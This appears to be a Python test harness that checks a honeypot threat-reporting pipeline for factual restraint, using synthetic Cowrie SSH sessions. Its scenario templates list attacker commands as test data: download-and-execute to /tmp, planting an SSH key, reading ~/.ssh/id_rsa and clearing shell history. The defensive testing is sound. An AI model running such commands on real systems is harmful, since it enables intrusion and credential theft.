"""Run a scoped factuality matrix over the deterministic reporting components."""

from __future__ import annotations

import argparse
import json
import re
from pathlib import Path
from types import SimpleNamespace
from typing import Any, Dict, Iterable, List

from production.classification.trust import is_trusted_classification_event
from production.correlation.session_ttp_correlation import apply_session_ttp_correlations, load_policy
from production.reporting.reporting_pipeline import (
    _build_evidence_grounded_actor_profile,
)
from production.reporting.threat_hypothesis import build_v2_report
from production.utils.serialization import utc_now
from production.workers.analysis_worker import build_threat_evidence_layers


class _EmptyBundle:
    ips: List[Any] = []
    urls: List[Any] = []


def _event(command: str, ttp: str | None, tactic: str, *, source: str = "rule", confidence: float = 1.0) -> Dict[str, Any]:
    trusted = source not in {"securebert_low_confidence", "shell_noise"}
    return {
        "command": command,
        "ttp": ttp,
        "tactic": tactic,
        "source": source,
        "confidence": confidence,
        "high_confidence": trusted,
    }


def _templates() -> List[Dict[str, Any]]:
    return [
        {"category": "no_command", "events": [], "raw_events": []},
        {"category": "discovery_only", "events": [_event("whoami", "T1033", "discovery")]},
        {"category": "downloader_without_download", "events": [_event("curl https://example.invalid/a -o /tmp/a", "T1105", "command-and-control")]},
        {"category": "confirmed_cowrie_download", "events": [_event("wget https://example.invalid/a -O /tmp/a", "T1105", "command-and-control")], "raw_events": [{"eventid": "cowrie.session.file_download", "outfile": "/tmp/a"}]},
        {"category": "execution_command", "events": [_event("sh /tmp/a", "T1059", "execution")]},
        {"category": "persistence_like", "events": [_event("echo ssh-ed25519 AAAA >> ~/.ssh/authorized_keys", "T1098", "persistence")]},
        {"category": "credential_file_access", "events": [_event("cat ~/.ssh/id_rsa", "T1552", "credential-access")]},
        {"category": "cleanup_history", "events": [_event("history -c", "T1070", "defense-evasion")]},
        {"category": "remote_service_attempt", "events": [_event("ssh root@192.0.2.5", "T1021", "lateral-movement")]},
        {"category": "privilege_attempt", "events": [_event("sudo -l", "T1548", "privilege-escalation")]},
        {"category": "conflicting_strong_and_weak", "events": [_event("whoami", "T1033", "discovery"), _event("ls /", "T1562", "defense-evasion", source="securebert_low_confidence", confidence=0.19)]},
        {"category": "weak_securebert_false_positive", "events": [_event("echo 1 > /dev/null", "T1496", "impact", source="securebert_low_confidence", confidence=0.25)]},
        {"category": "shell_noise_only", "events": [_event("pwd", None, "unknown", source="shell_noise", confidence=0.0)]},
        {"category": "compound_download_execute", "events": [_event("curl https://example.invalid/a -o /tmp/a", "T1105", "command-and-control"), _event("sh /tmp/a", "T1059", "execution")]},
        {"category": "cowrie_upload_event", "events": [_event("scp payload localhost:/tmp/payload", "T1105", "command-and-control")], "raw_events": [{"eventid": "cowrie.session.file_upload", "outfile": "/tmp/payload"}]},
    ]


def build_scenarios() -> List[Dict[str, Any]]:
    scenarios: List[Dict[str, Any]] = []
    for variant in range(1, 4):
        for template in _templates():
            events = [dict(event) for event in template.get("events", [])]
            commands = [str(event.get("command") or "") for event in events if event.get("command")]
            raw_events = [dict(event) for event in template.get("raw_events", [])]
            raw_events.extend(
                {"eventid": "cowrie.command.input", "input": command}
                for command in commands
            )
            scenarios.append({
                "session_id": f"factuality-{template['category']}-{variant:02d}",
                "category": template["category"],
                "commands": commands,
                "commands_success": commands,
                "classification_events": events,
                "raw_events": raw_events,
            })
    return scenarios


def _trusted_views(payload: Dict[str, Any]) -> Dict[str, Any]:
    events = [
        event for event in payload.get("classification_events", [])
        if is_trusted_classification_event(event)
    ]
    ttp_command_map: Dict[str, List[str]] = {}
    tactic_summary: Dict[str, List[str]] = {}
    for event in events:
        ttp = str(event.get("ttp") or "").split(".", 1)[0]
        tactic = str(event.get("tactic") or "")
        command = str(event.get("command") or "")
        if ttp:
            ttp_command_map.setdefault(ttp, []).append(command)
        if tactic and tactic != "unknown" and ttp:
            tactic_summary.setdefault(tactic, []).append(ttp)
    return {
        "events": events,
        "ttps": list(dict.fromkeys(ttp_command_map)),
        "ttp_command_map": ttp_command_map,
        "tactic_summary": tactic_summary,
    }


def evaluate_scenario(payload: Dict[str, Any], policy: Dict[str, Any]) -> Dict[str, Any]:
    correlated = apply_session_ttp_correlations(payload, policy)
    views = _trusted_views(correlated)
    bundle = _EmptyBundle()
    sessions = [SimpleNamespace(commands_success=list(payload.get("commands_success") or []))]
    profile = _build_evidence_grounded_actor_profile(
        views["tactic_summary"],
        views["ttp_command_map"],
        sessions,
        raw_events=payload.get("raw_events") or [],
    )
    canonical = build_v2_report(
        {},
        [correlated],
        raw_events=payload.get("raw_events") or [],
    )
    follow_on_payload = canonical["follow_on_hypothesis"]
    follow_claims = follow_on_payload.get("claims") or []
    follow_on = (
        "; ".join(str(item.get("text") or "") for item in follow_claims)
        if follow_claims
        else "Insufficient evidence to construct a bounded follow-on hypothesis."
    )
    evidence_gaps = [
        str(item.get("text") or "")
        for item in follow_on_payload.get("evidence_gaps") or []
        if isinstance(item, dict)
    ]
    falsifiers = [
        str(item.get("text") or "")
        for item in follow_on_payload.get("disconfirming_observations") or []
        if isinstance(item, dict)
    ]
    strength = canonical["claim_evidence_summary"]
    layers = build_threat_evidence_layers(correlated)
    category = str(payload["category"])
    has_download_event = any(
        event.get("eventid") == "cowrie.session.file_download"
        for event in payload.get("raw_events") or []
    )
    has_downloader = any(
        re.search(r"\b(?:curl|wget)\b", command, re.IGNORECASE)
        for command in payload.get("commands") or []
    )
    audit_count = sum(
        not is_trusted_classification_event(event)
        for event in payload.get("classification_events") or []
    )
    checks = {
        "facts_use_trusted_events_only": layers["direct_command_ttps"]["count"] == len(set(views["ttps"])),
        "audit_only_preserved_separately": layers["audit_only_classification_candidates"]["count"] == audit_count,
        "audit_only_not_direct_evidence": not any(
            item.get("main_ttp") in {
                str(event.get("ttp") or "").split(".", 1)[0]
                for event in payload.get("classification_events") or []
                if not is_trusted_classification_event(event)
            }
            for item in layers["direct_command_ttps"]["items"]
        ),
        "correlations_remain_report_only": all(
            not item.get("apply_to_prediction", False)
            for item in correlated.get("session_ttp_correlations") or []
        ),
        "actor_profile_is_not_attribution": profile.get("type") == "Unknown" and profile.get("sophistication") == "Unassessed",
        "actor_profile_separates_facts_and_inferences": all(
            key in profile for key in ("observed_facts", "supported_inferences", "unsupported_possibilities")
        ),
        "forecast_is_bounded": follow_on.lower().startswith(("possible", "insufficient evidence")) and not re.search(r"\bwill\b", follow_on, re.IGNORECASE),
        "scope_is_cowrie_observable": follow_on_payload.get("scope") == "post_session_cowrie_observable_behavior",
        "strength_is_not_probability": strength.get("metric_name") == "claim_evidence_summary" and strength.get("calibrated_probability") is False,
        "insufficient_when_no_trusted_evidence": bool(views["events"]) or follow_on_payload.get("abstained") is True,
        "downloader_success_not_overclaimed": (
            not has_downloader
            or has_download_event
            or (
                any("did not record a successful file-download" in item for item in profile["observed_facts"])
                and any("transfer success is not established" in item for item in profile["supported_inferences"])
            )
        ),
        "downloader_only_has_matching_falsifiers": (
            category != "downloader_without_download"
            or (
                any("No subsequent explicit artifact-execution" in item for item in evidence_gaps)
                and any("No persistence-related command" in item for item in evidence_gaps)
                and any("No Cowrie file-download event" in item for item in evidence_gaps)
            )
        ),
        "download_event_does_not_claim_execution": (
            not has_download_event
            or any("does not by itself establish execution" in item for item in profile["supported_inferences"])
        ),
        "weak_only_has_no_strong_hypothesis": (
            category not in {"weak_securebert_false_positive", "shell_noise_only"}
            or follow_on_payload.get("abstained") is True
        ),
    }
    return {
        "session_id": payload["session_id"],
        "category": category,
        "trusted_event_count": len(views["events"]),
        "audit_only_event_count": audit_count,
        "correlation_count": len(correlated.get("session_ttp_correlations") or []),
        "observed_facts": profile["observed_facts"],
        "supported_inferences": profile["supported_inferences"],
        "unsupported_possibilities": profile["unsupported_possibilities"],
        "follow_on_hypothesis": follow_on,
        "hypothesis_semantics": {
            "hypothesis_status": "insufficient_evidence" if follow_on_payload.get("abstained") else "bounded_hypothesis",
            "scope": follow_on_payload.get("scope"),
        },
        "claim_evidence_summary": strength,
        "falsification_conditions": falsifiers,
        "evidence_gaps": evidence_gaps,
        "checks": checks,
        "passed": all(checks.values()),
    }


def evaluate_matrix(policy_path: str | Path = "configs/session_ttp_correlation.trusted.json") -> Dict[str, Any]:
    policy = load_policy(policy_path)
    results = [evaluate_scenario(payload, policy) for payload in build_scenarios()]
    return {
        "schema_version": "threat_hypothesis_factuality_matrix.v1",
        "generated_at": utc_now(),
        "scope": "Cowrie honeypot-observable SSH behavior",
        "method": "controlled_scenario_consistency_test_using_production_deterministic_helpers",
        "ground_truth_status": "not_independent_human_validation",
        "scenario_count": len(results),
        "passed": sum(result["passed"] for result in results),
        "failed": sum(not result["passed"] for result in results),
        "results": results,
    }


def render_markdown(document: Dict[str, Any]) -> str:
    lines = [
        "# Threat-Hypothesis Factuality Matrix (2026-07-13)",
        "",
        "This controlled consistency matrix exercises production deterministic helpers under the "
        "Cowrie-observable scope. It is not independent human validation and does not measure field accuracy.",
        "",
        f"**Result:** {document['passed']}/{document['scenario_count']} scenarios passed; {document['failed']} failed.",
        "",
        "| Scenario | Category | Trusted | Audit-only | Correlations | Result |",
        "|---|---|---:|---:|---:|---|",
    ]
    for result in document["results"]:
        lines.append(
            f"| `{result['session_id']}` | `{result['category']}` | {result['trusted_event_count']} | "
            f"{result['audit_only_event_count']} | {result['correlation_count']} | "
            f"{'PASS' if result['passed'] else 'FAIL'} |"
        )
    failures = [result for result in document["results"] if not result["passed"]]
    lines.extend(["", "## Failed checks", ""])
    if not failures:
        lines.append("None.")
    else:
        for result in failures:
            failed = [name for name, passed in result["checks"].items() if not passed]
            lines.append(f"- `{result['session_id']}`: {', '.join(failed)}")
    lines.extend([
        "",
        "## Interpretation",
        "",
        "Passing means the implemented deterministic output obeyed the tested factuality constraints: "
        "trusted observations stayed separate from audit-only candidates, correlation findings remained "
        "report-only, forecasts were bounded hypotheses, and analytical evidence strength was not presented "
        "as probability. It does not establish analyst usefulness or empirical predictive validity.",
        "",
    ])
    return "\n".join(lines)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--policy", default="configs/session_ttp_correlation.trusted.json")
    parser.add_argument("--output", required=True)
    parser.add_argument("--markdown-output", required=True)
    args = parser.parse_args()
    document = evaluate_matrix(args.policy)
    output = Path(args.output)
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(json.dumps(document, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    markdown = Path(args.markdown_output)
    markdown.parent.mkdir(parents=True, exist_ok=True)
    markdown.write_text(render_markdown(document), encoding="utf-8")
    print(json.dumps({key: document[key] for key in ("scenario_count", "passed", "failed")}, indent=2))
    return 0 if document["failed"] == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
